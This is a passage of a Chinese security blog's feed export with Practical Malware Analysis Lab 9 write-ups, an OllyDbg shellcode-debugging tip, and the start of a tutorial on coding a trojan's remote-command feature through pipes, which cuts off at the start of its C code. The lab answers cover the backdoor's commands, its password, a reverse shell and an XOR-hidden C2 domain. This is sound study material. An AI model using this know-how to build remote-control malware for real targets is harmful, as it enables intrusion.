title="后门"></a>后门</h4><p>不带任何参数，且有配置信息的情况下，会执行连接服务器，并且根据服务器指令执行操作。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.19.png"></p><p>获取注册表中的配置信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.20.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.21.png"></p><p>指令共有五种，分别是sleep，upload，download，CMD，nothing</p><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h5><p>会执行sleep函数</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.22.png"></p><h5 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h5><p>是下载一个文件</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.23.png"></p><h5 id="download"><a href="#download" class="headerlink" title="download"></a>download</h5><p>发送内容</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.24.png"></p><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><p>会执行一个命令</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.25.png"></p><h5 id="nothing"><a href="#nothing" class="headerlink" title="nothing"></a>nothing</h5><p>什么都不做</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.26.png"></p><h3 id="1-如何让这个恶意代码安装自身？"><a href="#1-如何让这个恶意代码安装自身？" class="headerlink" title="1.如何让这个恶意代码安装自身？"></a>1.如何让这个恶意代码安装自身？</h3><p>从上数分析可以知道，需要使用-in选项。</p><h3 id="2-这个恶意代码的命令行选项是什么？它要求的密码是什么？"><a href="#2-这个恶意代码的命令行选项是什么？它要求的密码是什么？" class="headerlink" title="2.这个恶意代码的命令行选项是什么？它要求的密码是什么？"></a>2.这个恶意代码的命令行选项是什么？它要求的密码是什么？</h3><p>命令行选项有四种,-in,-re,-c,-cc密码是abcd</p><h3 id="3-如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码"><a href="#3-如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码" class="headerlink" title="3.如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码"></a>3.如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码</h3><p>修改跳转条件即可，这只是其中的一种方法，将JNZ修改为JMP。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.27.png"></p><h3 id="4-这个恶意代码基于系统的特征是什么？"><a href="#4-这个恶意代码基于系统的特征是什么？" class="headerlink" title="4.这个恶意代码基于系统的特征是什么？"></a>4.这个恶意代码基于系统的特征是什么？</h3><p>本地创建的名为Lab9-01的服务，还创建了一个XPS表项，其中的键值是连接所需的参数。</p><h3 id="5-这个恶意代码通过网络命令执行了哪些不同操作？"><a href="#5-这个恶意代码通过网络命令执行了哪些不同操作？" class="headerlink" title="5.这个恶意代码通过网络命令执行了哪些不同操作？"></a>5.这个恶意代码通过网络命令执行了哪些不同操作？</h3><p>上述分析已经分析清楚。</p><h3 id="6-这个恶意代码是否有网络特征？"><a href="#6-这个恶意代码是否有网络特征？" class="headerlink" title="6.这个恶意代码是否有网络特征？"></a>6.这个恶意代码是否有网络特征？</h3><p>有网络的连接，域名是<a href="http://www.practicalmalwareanalysis.com/">http://www.practicalmalwareanalysis.com</a></p><h2 id="Lab-9-2"><a href="#Lab-9-2" class="headerlink" title="Lab 9-2"></a>Lab 9-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>程序的整体流程比较简单。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.1.png"></p><p>首先程序会进行比较，比较当前运行的程序是否是ocl.exe</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.2.png"></p><p>然后会在401089函数中进行解密，是一个异或解密。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.3.png"></p><p>解密后的域名</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.4.png"></p><p>之后会连接域名，然后会调用401000，在其中创建了一个进程</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.5.png"></p><h3 id="1-在二进制文件中，你看到的静态字符串是什么？"><a href="#1-在二进制文件中，你看到的静态字符串是什么？" class="headerlink" title="1.在二进制文件中，你看到的静态字符串是什么？"></a>1.在二进制文件中，你看到的静态字符串是什么？</h3><p>只能看到这些字符串</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.6.png"></p><h3 id="2-当你运行这个二进制文件时，会发生什么？"><a href="#2-当你运行这个二进制文件时，会发生什么？" class="headerlink" title="2.当你运行这个二进制文件时，会发生什么？"></a>2.当你运行这个二进制文件时，会发生什么？</h3><p>不会发生什么，应该是会创建一个CMD进程。</p><h3 id="3-怎样让恶意代码的攻击负载（payload）获得运行？"><a href="#3-怎样让恶意代码的攻击负载（payload）获得运行？" class="headerlink" title="3.怎样让恶意代码的攻击负载（payload）获得运行？"></a>3.怎样让恶意代码的攻击负载（payload）获得运行？</h3><p>将名字改为ocl.exe</p><h3 id="4-在地址0x00401133处发生了什么？"><a href="#4-在地址0x00401133处发生了什么？" class="headerlink" title="4.在地址0x00401133处发生了什么？"></a>4.在地址0x00401133处发生了什么？</h3><p>将一些数据赋值给一个地址，主要是为了隐藏字符串，这也是为什么刚才字符串窗口并没有什么有用的信息，shellcode的编写手法之一，可以参考<a href="https://b1ackie.cn/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习 </a></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.7.png"></p><h3 id="5-传递个子例程（函数）0x00401089的参数是什么？"><a href="#5-传递个子例程（函数）0x00401089的参数是什么？" class="headerlink" title="5.传递个子例程（函数）0x00401089的参数是什么？"></a>5.传递个子例程（函数）0x00401089的参数是什么？</h3><p>是这两个参数，其中一个是加密的字符串</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.8.png"></p><p>另一个是用来进行异或解密的数据</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.9.png"></p><h3 id="6-恶意代码使用的域名是什么？"><a href="#6-恶意代码使用的域名是什么？" class="headerlink" title="6.恶意代码使用的域名是什么？"></a>6.恶意代码使用的域名是什么？</h3><p><a href="http://www.practicalmalwareanalysis.com/">www.practicalmalwareanalysis.com</a></p><h3 id="7-恶意代码使用什么编码函数来混淆域名？"><a href="#7-恶意代码使用什么编码函数来混淆域名？" class="headerlink" title="7.恶意代码使用什么编码函数来混淆域名？"></a>7.恶意代码使用什么编码函数来混淆域名？</h3><p>异或</p><h3 id="8-恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？"><a href="#8-恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？" class="headerlink" title="8.恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？"></a>8.恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？</h3><p>这块用书上的话来说是一个反向的SHELL，</p><p>书上的原话：</p><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">STARTUPINFO结构中的标准流被设置为一个套接字。这直接绑定套接字和<span class="hljs-built_in">cmd</span>.exe的标准流，所以<span class="hljs-built_in">cmd</span>.exe被启动后，所有经过套接字的数据都将发送到<span class="hljs-built_in">cmd</span>.exe，并且<span class="hljs-built_in">cmd</span>.exe产生的所有输出都将通过套接字发出。<br></code></pre></div></td></tr></table></figure><p>这里我并没有分析出来，就借用了书上的解答。</p><h2 id="Lab-9-3"><a href="#Lab-9-3" class="headerlink" title="Lab 9-3"></a>Lab 9-3</h2><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>整体流程也是比较简单的，可以看到首先是调用了三个DLL中的函数，然后是writefile函数向某文件写入数据。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.1.png"></p><p>运行DLL主要会打印出这三行信息，下面来仔细分析一下到底做了什么。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.2.png"></p><h4 id="DLL1"><a href="#DLL1" class="headerlink" title="DLL1"></a>DLL1</h4><p>先来看看第一个DLL。</p><p>可以看到这是DLL1Print函数，其中dword_10008030就是打印的数据，可以查看交叉引用，看看究竟是什么。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.3.png"></p><p>可以看到这个值是当前进程的PID</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.4.png"></p><h4 id="DLL2"><a href="#DLL2" class="headerlink" title="DLL2"></a>DLL2</h4><p>再来看第二个DLL，这是导出函数 DLL2Print，看到dword_1000B078是其打印的数据，还是交叉引用查看。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.5.png"></p><p>可以看到是这个数据是创建文件的句柄。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.6.png"></p><p>而另一个导出函数DLL2ReturnJ可以看到返回了一个值，从上图可以看到这个值就是文件的句柄。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.7.png"></p><h4 id="DLL3"><a href="#DLL3" class="headerlink" title="DLL3"></a>DLL3</h4><p>DLL3有两个导出函数</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.8.png"></p><p>DLL3Print打印信息，可以看到是&amp;WideCharStr，交叉引用查看。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.9.png"></p><p>可以看到这是MultiByteToWideChar函数的一个参数，而这个参数作用是</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">lpMultiByteStr</span><br>指向要转换的字符串的指针。<br></code></pre></div></td></tr></table></figure><p>这个函数作用是将字符串映射到 UTF-16（宽字符）字符串，也就是&amp;WideCharStr这其中保存着转为宽字符后的数据的地址。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.10.png"></p><p>导出函数DLL3GetStructure返回了一个值，从上图可以看出，这里其实是返回了一个结构体的地址。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.11.png"></p><h3 id="1-Lab9-3-exe导入了哪些DLL？"><a href="#1-Lab9-3-exe导入了哪些DLL？" class="headerlink" title="1.Lab9-3.exe导入了哪些DLL？"></a>1.Lab9-3.exe导入了哪些DLL？</h3><p>导入了四个DLL</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.12.png"></p><h3 id="2-DLL1-dll、DLL2-dll、DLL3-dll要求的基址是多少？"><a href="#2-DLL1-dll、DLL2-dll、DLL3-dll要求的基址是多少？" class="headerlink" title="2.DLL1.dll、DLL2.dll、DLL3.dll要求的基址是多少？"></a>2.DLL1.dll、DLL2.dll、DLL3.dll要求的基址是多少？</h3><p>都是10000000</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.13.png"></p><h3 id="3-当使用OD调试时，为DLL1-dll、DLL2-dll、DLL3-dll分配的基址是什么？"><a href="#3-当使用OD调试时，为DLL1-dll、DLL2-dll、DLL3-dll分配的基址是什么？" class="headerlink" title="3.当使用OD调试时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基址是什么？"></a>3.当使用OD调试时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基址是什么？</h3><p>分别是200000,、210000、220000</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.14.png"></p><h3 id="4-当调用DLL1-dll中的一个导入函数时，这个导入函数都做了些什么？"><a href="#4-当调用DLL1-dll中的一个导入函数时，这个导入函数都做了些什么？" class="headerlink" title="4.当调用DLL1.dll中的一个导入函数时，这个导入函数都做了些什么？"></a>4.当调用DLL1.dll中的一个导入函数时，这个导入函数都做了些什么？</h3><p>打印出了当前的进程的PID</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.15.png"></p><h3 id="5-当调用writefile函数时，写入的文件名是什么？"><a href="#5-当调用writefile函数时，写入的文件名是什么？" class="headerlink" title="5.当调用writefile函数时，写入的文件名是什么？"></a>5.当调用writefile函数时，写入的文件名是什么？</h3><p>temp.txt</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.16.png"></p><h3 id="6-当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？"><a href="#6-当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？" class="headerlink" title="6.当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？"></a>6.当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？</h3><p>从DLL3中的DLL3GetStructure获取</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.17.png"></p><h3 id="7-在运行或调试时，会看到程序打印出三块神秘数据。DLL1-dll、DLL2-dll、DLL3-dll它们的神秘数据分别什么？"><a href="#7-在运行或调试时，会看到程序打印出三块神秘数据。DLL1-dll、DLL2-dll、DLL3-dll它们的神秘数据分别什么？" class="headerlink" title="7.在运行或调试时，会看到程序打印出三块神秘数据。DLL1.dll、DLL2.dll、DLL3.dll它们的神秘数据分别什么？"></a>7.在运行或调试时，会看到程序打印出三块神秘数据。DLL1.dll、DLL2.dll、DLL3.dll它们的神秘数据分别什么？</h3><p>前面详细分析可知，第一个是当前进程的PID，第二个是文件句柄，第三个是保存着宽字符数据的地址。</p><h3 id="8-如何将DLL2-dll加载到IDA-PRO中，使得它与OD使用的加载地址匹配？"><a href="#8-如何将DLL2-dll加载到IDA-PRO中，使得它与OD使用的加载地址匹配？" class="headerlink" title="8.如何将DLL2.dll加载到IDA PRO中，使得它与OD使用的加载地址匹配？"></a>8.如何将DLL2.dll加载到IDA PRO中，使得它与OD使用的加载地址匹配？</h3><p>可以在IDA里Edit–&gt;Segments–&gt;Rebase Program改变基址</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.18.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-9-1&quot;&gt;&lt;a href=&quot;#Lab-9-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 9-1&quot;&gt;&lt;/a&gt;Lab 9-1&lt;/h2&gt;&lt;h3 id=&quot;详细分析&quot;&gt;&lt;a href=&quot;#详细分析&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>shellcode的分析调试小技巧</title>
    <link href="https://b1ackie.cn/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://b1ackie.cn/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2021-08-31T10:37:14.000Z</published>
    <updated>2021-08-31T10:57:23.656Z</updated>
    
    <content type="html"><![CDATA[<h3 id="分析shellcode"><a href="#分析shellcode" class="headerlink" title="分析shellcode"></a>分析shellcode</h3><p>OD有一种简单的分析shellcode的方法。</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先是复制shellcode</p><p>这里我用自己写的弹窗小程序，并且使用十六进制编辑器WINHEX进行复制。</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>然后是打开OD，附加任意一个程序，打开内存映射窗口，快捷操作就是上面的M，然后寻找类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享），选择它。</p><p><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/1.png"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>选中一大片区域，然后将复制的数据粘贴进去<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/2.png"></p><p>可以右键选择反汇编，这样就会显示汇编代码，而不是十六进制数据，复制后如图所示。<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/3.png"></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>在反汇编窗口中跳到地址，可以在上面图中看到首地址是12D000，那么在反汇编窗口中跳到此地址，然后选择设置为新的EIP，这样就就可以开始调试shellcode了。</p><p><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/4.png"></p><p>调试到弹窗的地方<br><img src="/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/5.png"></p><p>这样可以方便调试shellcode，感觉还是很方便的。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《恶意代码分析实战》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;分析shellcode&quot;&gt;&lt;a href=&quot;#分析shellcode&quot; class=&quot;headerlink&quot; title=&quot;分析shellcode&quot;&gt;&lt;/a&gt;分析shellcode&lt;/h3&gt;&lt;p&gt;OD有一种简单的分析shellcode的方法。&lt;/p&gt;
&lt;h3 id</summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="shellcode" scheme="https://b1ackie.cn/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>功能技术远程CMD</title>
    <link href="https://b1ackie.cn/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/"/>
    <id>https://b1ackie.cn/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/</id>
    <published>2021-08-30T07:26:03.000Z</published>
    <updated>2021-08-30T08:27:29.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="远程CMD"><a href="#远程CMD" class="headerlink" title="远程CMD"></a>远程CMD</h2><p>CMD，提示进行命令输入的一种工作提示符，在windows系统下，相当于在windows窗口使用的DOS系统，简单来讲，CMD就是通过命令行实现键鼠的操作。</p><p>现在介绍的远程CMD是指病毒木马获取控制端发送过来的CMD命令，执行后将结果回传给控制端。</p><p>有许多的API都可以实现CMD命令，比如WinExec,CreateProcess但是这些函数不能获取执行后的操作结果。所以实现远程CMD的关键是获取CMD的执行结果，接下来介绍如何执行CMD，并通过匿名管道的方法获取执行结果，实现远程CMD。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="CreatePipe"><a href="#CreatePipe" class="headerlink" title="CreatePipe"></a>CreatePipe</h3><p>创建一个匿名管道，并从中得到读写管道的句柄。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">CreatePipe</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hReadPipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHANDLE               hWritePipe,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD                 nSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>hReadPipe：返回一个刻度管道数据的文件句柄。</p><p>hWritePipe：返回一个可写管道数据的文件句柄。</p><p>lpPipeAttributes：传入一个SECURITY_ATTRIBUTES结构的指针，该结构决定此函数返回的句柄是否可由子进程继承。如果传入为NUL，则不可进程。</p><p>nSize：指向管道的缓冲区大小。但是这仅仅是一个理想值，系统根据这个值创建大小相近的缓冲区。如果传入0，那么系统将使用一个默认的缓冲区大小。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值不为0；</p><p>如果函数失败，则返回值为0。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>管道是一种在进程间共享数据的机制，其实质是一段共享内存。windows系统为这段共享的内存设计使用数据流I/O的方式来访问。一个进程读，另一个进程写，这类似一个管道的两端。实现远程CMD的流程如下：</p><p>首先初始化匿名管道的安全属性结构SECURITY_ATTRIBUTES，调用CreatePipe函数创建匿名管道，获取管道数据读取句柄和管道数据写入句柄。</p><p>对即将创建的进程结构体STARTUPINFO进行初始化，隐藏进程窗口，并把上面的管道数据写入句柄赋值给新进程控制台窗口的缓存句柄，这样，新进程会把窗口缓存的输出数据写入到匿名管道中。</p><p>调用CreateProcess函数创建新的进程，执行CMD命令，并调用WaitForSingleObject等待命令执行完毕。执行完毕后，就调用ReadFile函数根据匿名管道的数据读取句柄从匿名管道的缓冲区中读取数据，这个数据就是命令的返回结果。</p><p>最后便可以关闭句柄，释放资源。</p><h2 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h2><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Windows</span>.</span></span>h&gt;<br>#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;<br>BOOL <span class="hljs-constructor">PipeCmd(<span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszCmd</span>, <span class="hljs-params">char</span><span class="hljs-operator">*</span> <span class="hljs-params">pszResultBuffer</span>, DWORD <span 